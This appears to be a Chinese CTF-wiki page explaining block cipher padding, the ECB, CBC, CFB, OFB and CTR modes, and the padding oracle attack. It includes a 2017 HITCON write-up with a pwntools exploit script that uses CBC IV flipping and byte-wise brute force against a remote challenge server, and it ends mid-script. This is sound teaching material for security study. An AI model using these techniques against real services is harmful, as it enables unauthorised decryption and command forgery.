\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 80 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 \u8fd9\u91cc\u5176\u5b9e\u5c31\u662f\u548c md5 \u548c sha1 \u7684 padding \u5dee\u4e0d\u591a\u3002 Pad with zeroes except make the last byte equal to the number of padding bytes \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8 Pad with zero (null) characters \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75 Pad with spaces \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 20 20 20 20 20 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25 ECB \u00b6 ECB\u6a21\u5f0f\u5168\u79f0\u4e3a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f\uff08Electronic codebook\uff09\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u5b9e\u73b0\u7b80\u5355\u3002 \u4e0d\u540c\u660e\u6587\u5206\u7ec4\u7684\u52a0\u5bc6\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\uff0c\u901f\u5ea6\u5f88\u5feb\u3002 \u7f3a\u70b9 \u00b6 \u540c\u6837\u7684\u660e\u6587\u5757\u4f1a\u88ab\u52a0\u5bc6\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\uff0c\u4e0d\u4f1a\u9690\u85cf\u660e\u6587\u5206\u7ec4\u7684\u7edf\u8ba1\u89c4\u5f8b\u3002\u6b63\u5982\u4e0b\u56fe\u6240\u793a \u4e3a\u4e86\u89e3\u51b3\u7edf\u4e00\u660e\u6587\u4ea7\u751f\u76f8\u540c\u5bc6\u6587\u7684\u95ee\u9898\uff0c\u63d0\u51fa\u4e86\u5176\u5b83\u7684\u52a0\u5bc6\u6a21\u5f0f\u3002 \u5178\u578b\u5e94\u7528 \u00b6 \u7528\u4e8e\u968f\u673a\u6570\u7684\u52a0\u5bc6\u4fdd\u62a4\u3002 \u7528\u4e8e\u5355\u5206\u7ec4\u660e\u6587\u7684\u52a0\u5bc6\u3002 2016 ABCTF aes-mess-75 \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this? [HINT] There has to be some way to work backwards, right? \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u52a0\u5bc6\u662f\u4e00\u4e2a ECB \u52a0\u5bc6\uff0c\u7136\u540e AES \u662f 16 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u6bcf\u4e2a\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528\u4e24\u4e2a 16 \u8fdb\u5236\u5b57\u7b26\u8868\u793a\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u6bcf 32 \u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u5206\u7ec4\uff0c\u7136\u540e\u53bb\u5bf9\u5e94\u7684 txt \u6587\u4ef6\u4e2d\u641c\u7d22\u5373\u53ef\u3002 \u5bf9\u5e94 flag e220eb994c8fc16388dbd60a969d4953 abctf{looks_like f042fc0bce25dbef573cf522636a1ba3 _you_can_break_a fafa1a7c21ff824a5824c5dc4a376e75 es} \u6700\u540e\u4e00\u4e2a\u663e\u7136\u5728\u52a0\u5bc6\u65f6\u8fdb\u884c\u4e86 padding\u3002 \u9898\u76ee \u00b6 2018 PlaidCTF macsh CBC \u00b6 CBC\u5168\u79f0\u4e3a\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5\uff08Cipher-block chaining\uff09 \u6a21\u5f0f\uff0c\u8fd9\u91cc IV \u4e0d\u8981\u6c42\u4fdd\u5bc6 IV \u5fc5\u987b\u662f\u4e0d\u53ef\u9884\u6d4b\u7684\uff0c\u800c\u4e14\u8981\u4fdd\u8bc1\u5b8c\u6574\u6027\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u5bc6\u6587\u5757\u4e0d\u4ec5\u548c\u5f53\u524d\u5bc6\u6587\u5757\u76f8\u5173\uff0c\u800c\u4e14\u548c\u524d\u4e00\u4e2a\u5bc6\u6587\u5757\u6216 IV \u76f8\u5173\uff0c\u9690\u85cf\u4e86\u660e\u6587\u7684\u7edf\u8ba1\u7279\u6027\u3002 \u5177\u6709\u6709\u9650\u7684\u4e24\u6b65\u9519\u8bef\u4f20\u64ad\u7279\u6027\uff0c\u5373\u5bc6\u6587\u5757\u4e2d\u7684\u4e00\u4f4d\u53d8\u5316\u53ea\u4f1a\u5f71\u54cd\u5f53\u524d\u5bc6\u6587\u5757\u548c\u4e0b\u4e00\u5bc6\u6587\u5757\u3002 \u5177\u6709\u81ea\u540c\u6b65\u7279\u6027\uff0c\u5373\u7b2c k \u5757\u8d77\u5bc6\u6587\u6b63\u786e\uff0c\u5219\u7b2c k+1 \u5757\u5c31\u80fd\u6b63\u5e38\u89e3\u5bc6\u3002 \u7f3a\u70b9 \u00b6 \u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\uff0c\u89e3\u5bc6\u53ef\u4ee5\u5e76\u884c\u3002 \u5e94\u7528 \u00b6 CBC \u5e94\u7528\u5341\u5206\u5e7f\u6cdb \u5e38\u89c1\u7684\u6570\u636e\u52a0\u5bc6\u548c TLS \u52a0\u5bc6\u3002 \u5b8c\u6574\u6027\u8ba4\u8bc1\u548c\u8eab\u4efd\u8ba4\u8bc1\u3002 \u653b\u51fb \u00b6 \u5b57\u8282\u53cd\u8f6c\u653b\u51fb IV \u5411\u91cf\uff0c\u5f71\u54cd\u7b2c\u4e00\u4e2a\u660e\u6587\u5206\u7ec4 \u7b2c n \u4e2a\u5bc6\u6587\u5206\u7ec4\uff0c\u5f71\u54cd\u7b2c n + 1 \u4e2a\u660e\u6587\u5206\u7ec4 Padding Oracle Attack\uff0c\u5177\u4f53\u53c2\u89c1\u4e0b\u9762\u4ecb\u7ecd\u3002 PCBC \u00b6 PCBC \u7684\u5168\u79f0\u4e3a\u660e\u6587\u5bc6\u7801\u5757\u94fe\u63a5\uff08Plaintext cipher-block chaining\uff09\u3002\u4e5f\u79f0\u4e3a\u586b\u5145\u5bc6\u7801\u5757\u94fe\u63a5\uff08Propagating cipher-block chaining\uff09\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u7279\u70b9 \u00b6 \u89e3\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316 \u4e92\u6362\u90bb\u63a5\u7684\u5bc6\u6587\u5757\u4e0d\u4f1a\u5bf9\u540e\u9762\u7684\u5bc6\u6587\u5757\u9020\u6210\u5f71\u54cd CFB \u00b6 CFB \u5168\u79f0\u4e3a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f\uff08Cipher feedback\uff09\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u9002\u5e94\u4e8e\u4e0d\u540c\u6570\u636e\u683c\u5f0f\u7684\u8981\u6c42 \u6709\u9650\u9519\u8bef\u4f20\u64ad \u81ea\u540c\u6b65 \u7f3a\u70b9 \u00b6 \u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\u5316\uff0c\u89e3\u5bc6\u4e0d\u80fd\u5e76\u884c \u5e94\u7528\u573a\u666f \u00b6 \u8be5\u6a21\u5f0f\u9002\u5e94\u4e8e\u6570\u636e\u5e93\u52a0\u5bc6\uff0c\u65e0\u7ebf\u901a\u4fe1\u52a0\u5bc6\u7b49\u5bf9\u6570\u636e\u683c\u5f0f\u6709\u7279\u6b8a\u8981\u6c42\u7684\u52a0\u5bc6\u73af\u5883\u3002 \u9898\u76ee \u00b6 HITCONCTF-Quals-2015-Simple-(Crypto-100) OFB \u00b6 OFB\u5168\u79f0\u4e3a\u8f93\u51fa\u53cd\u9988\u6a21\u5f0f\uff08Output feedback\uff09\uff0c\u5176\u53cd\u9988\u5185\u5bb9\u662f\u5206\u7ec4\u52a0\u5bc6\u540e\u7684\u5185\u5bb9\u800c\u4e0d\u662f\u5bc6\u6587\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u4e0d\u5177\u6709\u9519\u8bef\u4f20\u64ad\u7279\u6027\u3002 \u7f3a\u70b9 \u00b6 IV \u65e0\u9700\u4fdd\u5bc6\uff0c\u4f46\u662f\u5bf9\u6bcf\u4e2a\u6d88\u606f\u5fc5\u987b\u9009\u62e9\u4e0d\u540c\u7684 IV\u3002 \u4e0d\u5177\u6709\u81ea\u540c\u6b65\u80fd\u529b\u3002 \u9002\u7528\u573a\u666f \u00b6 \u9002\u7528\u4e8e\u4e00\u4e9b\u660e\u6587\u5197\u4f59\u5ea6\u6bd4\u8f83\u5927\u7684\u573a\u666f\uff0c\u5982\u56fe\u50cf\u52a0\u5bc6\u548c\u8bed\u97f3\u52a0\u5bc6\u3002 CTR \u00b6 CTR\u5168\u79f0\u4e3a\u8ba1\u6570\u5668\u6a21\u5f0f\uff08Counter mode\uff09\uff0c\u8be5\u6a21\u5f0f\u7531 Diffe \u548c Hellman \u8bbe\u8ba1\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u9898\u76ee \u00b6 2017 star ctf ssss 2017 star ctf ssss2 Padding Oracle Attack \u00b6 \u4ecb\u7ecd \u00b6 Padding Oracle Attack \u653b\u51fb\u4e00\u822c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6 \u52a0\u5bc6\u7b97\u6cd5 \u91c7\u7528 PKCS5 Padding \u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5f53\u7136\uff0c\u975e\u5bf9\u79f0\u52a0\u5bc6\u4e2d OAEP \u7684\u586b\u5145\u65b9\u5f0f\u4e5f\u6709\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002 \u5206\u7ec4\u6a21\u5f0f\u4e3a CBC \u6a21\u5f0f\u3002 \u653b\u51fb\u8005\u80fd\u529b \u653b\u51fb\u8005\u53ef\u4ee5\u62e6\u622a\u4e0a\u8ff0\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\u6d88\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u548c padding oracle\uff08\u5373\u670d\u52a1\u5668\uff09 \u8fdb\u884c\u4ea4\u4e92\uff1a\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u5bc6\u6587\uff0c\u670d\u52a1\u5668\u7aef\u4f1a\u4ee5\u67d0\u79cd\u8fd4\u56de\u4fe1\u606f\u544a\u77e5\u5ba2\u6237\u7aef padding \u662f\u5426\u6b63\u5e38\u3002 Padding Oracle Attack \u653b\u51fb\u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u5982\u4e0b \u5728\u4e0d\u6e05\u695a key \u548c IV \u7684\u524d\u63d0\u4e0b\u89e3\u5bc6\u4efb\u610f\u7ed9\u5b9a\u7684\u5bc6\u6587\u3002 \u539f\u7406 \u00b6 Padding Oracle Attack \u653b\u51fb\u7684\u57fa\u672c\u539f\u7406\u5982\u4e0b \u5bf9\u4e8e\u5f88\u957f\u7684\u6d88\u606f\u4e00\u5757\u4e00\u5757\u89e3\u5bc6\u3002 \u5bf9\u4e8e\u6bcf\u4e00\u5757\u6d88\u606f\uff0c\u5148\u89e3\u5bc6\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u89e3\u5bc6\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002 \u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b CBC \u7684 \u52a0\u5bc6 C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV \u89e3\u5bc6 P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e\u89e3\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 IV \u548c key\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u5bc6\u6587\u5757\u7684\u957f\u5ea6\u4e3a n \u4e2a\u5b57\u8282\u3002 \u5047\u8bbe\u6211\u4eec\u622a\u83b7\u4e86\u5bc6\u6587 Y\uff0c\u4ee5\u83b7\u53d6\u5bc6\u6587 Y \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a\u4f8b\u5b50\u8fdb\u884c\u5206\u6790\u3002\u4e3a\u4e86\u83b7\u53d6 Y \u7684\u5185\u5bb9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4f2a\u9020\u4e00\u5757\u5bc6\u6587 F \u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u662f\u56e0\u4e3a\u82e5\u6211\u4eec\u6784\u9020\u5bc6\u6587 F|Y \uff0c\u90a3\u4e48\u89e3\u5bc6 Y \u65f6\u5177\u4f53\u4e3a $$ P=D_K(Y)\\oplus F $$ \u6240\u4ee5\u4fee\u6539\u5bc6\u6587 F \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282 F_{n} F_{n} \u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u7684\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u4e0b\u9762\u7ed9\u51fa\u83b7\u53d6 P \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u8fc7\u7a0b i=0\uff0c\u8bbe\u7f6e F \u7684\u6bcf\u4e2a\u5b57\u8282\u4e3a \u968f\u673a\u5b57\u8282 \u3002 \u8bbe\u7f6e F_n=i \\oplus 0x01 F_n=i \\oplus 0x01 \u5c06 F|Y \u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5982\u679c P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f i \u7684\u8bdd\uff0c\u90a3\u4e48\u6700\u540e\u7684 padding \u5c31\u662f 0x01\uff0c\u4e0d\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u5426\u5219\uff0c\u53ea\u6709 P \u7684\u6700\u540e P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u5b57\u8282\u90fd\u662f P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u624d\u4e0d\u4f1a\u62a5\u9519\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f padding \u7684\u5b57\u8282\u53ea\u80fd\u662f 0 \u5230 n\u3002 \u56e0\u6b64\uff0c\u82e5\u60f3\u8981\u4f7f\u5f97\u5728 F \u968f\u673a\u5730\u60c5\u51b5\u4e0b\uff0c\u5e76\u4e14\u6ee1\u8db3padding \u5b57\u8282\u5927\u5c0f\u7684\u7ea6\u675f\u60c5\u51b5\u4e0b\u8fd8\u4e0d\u62a5\u9519 \u6982\u7387\u5f88\u5c0f \u3002\u6240\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u4e0d\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u786e\u5b9e\u83b7\u53d6\u4e86\u6b63\u786e\u7684\u5b57\u8282\u3002 \u5728\u51fa\u73b0\u9519\u8bef\u7684\u60c5\u51b5\u4e0b\uff0ci=i+1\uff0c\u8df3\u8f6c\u52302\u3002 \u5f53\u83b7\u53d6\u4e86 P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u83b7\u53d6 P \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u6b64\u65f6\u9700\u8981\u8bbe\u7f6e F_n=P_n\\oplus 0x02 F_n=P_n\\oplus 0x02 \uff0c\u540c\u65f6\u8bbe\u7f6e F_{n-1}=i \\oplus 0x02 F_{n-1}=i \\oplus 0x02 \u53bb\u679a\u4e3e i\u3002 \u6240\u4ee5\uff0c\u7efc\u4e0a\u6240\u793a\uff0cPadding Oracle Attack \u5176\u5b9e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u662f\u4e00\u79cd\u5177\u6709\u5f88\u5927\u6982\u7387\u6210\u529f\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f80\u5f80\u9047\u5230\u7684\u4e00\u4e9b\u73b0\u5b9e\u95ee\u9898\u5e76\u4e0d\u662f\u6807\u51c6\u7684 Padding Oracle Attack \u6a21\u5f0f\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u53d8\u5f62\u3002 2017 HITCON Secret Server \u00b6 \u5206\u6790 \u00b6 \u7a0b\u5e8f\u4e2d\u91c7\u7528\u7684\u52a0\u5bc6\u662f AES CBC\uff0c\u5176\u4e2d\u91c7\u7528\u7684 padding \u4e0e PKCS5 \u7c7b\u4f3c def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] \u4f46\u662f\uff0c\u5728\u6bcf\u6b21 unpad \u65f6\u5e76\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u662f\u76f4\u63a5\u8fdb\u884c unpad\u3002 \u5176\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21\u548c\u7528\u6237\u4ea4\u4e92\u7684\u51fd\u6570\u662f send_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684\u660e\u6587\uff0c\u4f7f\u7528\u56fa\u5b9a\u7684 2jpmLoSsOlQrqyqE \u4f5c\u4e3a IV\uff0c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u7ed3\u679c\u8f93\u51fa\u3002 recv_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684 IV \u548c\u5bc6\u6587\uff0c\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u8fd4\u56de\u3002\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u4f1a\u6709\u4e0d\u540c\u7684\u64cd\u4f5c msg = recv_msg () . strip () if msg . startswith ( 'exit-here' ): exit ( 0 ) elif msg . startswith ( 'get-flag' ): send_msg ( flag ) elif msg . startswith ( 'get-md5' ): send_msg ( MD5 . new ( msg [ 7 :]) . digest ()) elif msg . startswith ( 'get-time' ): send_msg ( str ( time . time ())) elif msg . startswith ( 'get-sha1' ): send_msg ( SHA . new ( msg [ 8 :]) . digest ()) elif msg . startswith ( 'get-sha256' ): send_msg ( SHA256 . new ( msg [ 10 :]) . digest ()) elif msg . startswith ( 'get-hmac' ): send_msg ( HMAC . new ( msg [ 8 :]) . digest ()) else : send_msg ( 'command not found' ) \u4e3b\u8981\u6f0f\u6d1e \u00b6 \u8fd9\u91cc\u6211\u4eec\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5df2\u6709\u7684\u90e8\u5206 \u52a0\u5bc6 \u52a0\u5bc6\u65f6\u7684 IV \u662f\u56fa\u5b9a\u7684\u800c\u4e14\u5df2\u77e5\u3002 'Welcome!!' \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u89e3\u5bc6 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 IV\u3002 \u9996\u5148\uff0c\u65e2\u7136\u6211\u4eec\u77e5\u9053 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u8fd8\u53ef\u4ee5\u63a7\u5236 recv_msg \u4e2d\u7684 IV\uff0c\u90a3\u4e48\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u5982\u679c\u6211\u4eec\u5c06 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u8f93\u5165\u7ed9 recv_msg\uff0c\u90a3\u4e48\u76f4\u63a5\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u4fbf\u662f \uff08Welcome!!+'\\x07'*7) xor iv \uff0c\u5982\u679c\u6211\u4eec \u6070\u5f53\u7684\u63a7\u5236\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f20\u9012\u7684 iv \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u6267\u884c \u4e0a\u8ff0\u6240\u8bf4\u7684\u4efb\u610f\u547d\u4ee4 \u3002\u4ece\u800c\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u77e5\u9053 flag \u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u5176\u6b21\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u5982\u679c\u6211\u4eec\u5728\u4efb\u4f55\u5bc6\u6587 C \u540e\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 IV \u548c Welcome \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 recv_msg\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u4e4b\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c \u90a3\u4e48\u7531\u4e8e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u957f\u5ea6\u51cf\u5c0f 0 \u5230 255 \u3002 \u5229\u7528\u601d\u8def \u00b6 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work \u6839\u636e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u65b9\u5f0f\u83b7\u53d6\u52a0\u5bc6\u540e\u7684 flag\u3002 \u7531\u4e8e flag \u7684\u5f00\u5934\u662f hitcon{ \uff0c\u4e00\u5171\u67097\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u4efb\u7136\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 iv \u6765\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u524d 7 \u4e2a\u5b57\u8282\u4e3a\u6307\u5b9a\u5b57\u8282\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e8e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6267\u884c get-md5 \u547d\u4ee4\u3002\u800c\u6839\u636e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6070\u597d\u5728\u6d88\u606f\u7684\u7b2c\u51e0\u4e2a\u5b57\u8282\u5904\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u65f6\u5c06\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u4e3a hitcon{x \uff0c\u5373\u53ea\u4fdd\u7559 hitcon{ \u540e\u7684\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u83b7\u5f97\u5e26\u4e00\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5e26\u5236\u5b9a\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u9010\u5b57\u8282\u7206\u7834\uff0c\u8ba1\u7b97\u5bf9\u5e94 md5 \uff0c\u7136\u540e\u518d\u6b21\u5229\u7528\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u660e\u6587\u4e3a\u4efb\u610f\u6307\u5b9a\u547d\u4ee4\uff0c\u5982\u679c\u63a7\u5236\u4e0d\u6210\u529f\uff0c\u90a3\u8bf4\u660e\u8be5\u5b57\u8282\u4e0d\u5bf9\uff0c\u9700\u8981\u518d\u6b21\u7206\u7834\uff1b\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5bf9\u5e94\u7684\u547d\u4ee4\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b #coding=utf-8 from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' if args [ 'REMOTE' ]: p = remote ( '52.193.157.19' , 9999 ) else : p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # \u53bb\u6389pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) p . recvuntil ( 'Done! \\n ' ) iv_encrypt = '2jpmLoSsOlQrqyqE' def getmd5enc ( i , cipher_flag , cipher_welcome ): \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\" ## keep iv[7:] do not change, so decrypt won't change new_iv = flipplain ( \"hitcon{\" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) payload = new_iv + cipher_flag ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_flag ) + 16 + 16 - ( 7 + i + 1 )), iv_encrypt ) payload += last_byte_iv + cipher_welcome p . sendline ( base64 . b64encode ( payload )) return p . recvuntil ( \" \\n \" , drop = True ) def main (): bypassproof () # result of encrypted Welcome!! cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_welcome = base64 . b64decode ( cipher )[ 16 :] log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-flag get_flag_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-flag\" ), iv_encrypt ) payload = base64 . b64encode ( get_flag_iv + cipher_welcome ) p . sendline ( payload ) cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_flag = base64 . b64decode ( cipher )[ 16 :] flaglen = len ( cipher_flag ) log . info ( \"cipher flag is : \" + cipher_flag ) # get command not found cipher p . sendline ( base64 . b64encode ( iv_encrypt + cipher_welcome )) cipher_notfound = p . recvuntil ( ' \\n ' , drop = True ) flag = \"\" # brute force for every byte of flag for i in range ( flaglen - 7 ): md5_indexi = getmd5enc ( i , cipher_flag , cipher_welcome ) md5_indexi = base64 . b64decode ( md5_indexi )[ 16 :] log . info ( \"get encrypt(md5(flag[7:7+i])): \" + md5_indexi ) for guess in range ( 256 ): # locally compute md5 hash guess_md5 = MD5 . new ( flag + chr ( guess )) . digest () # try to null out the md5 plaintext and execute a 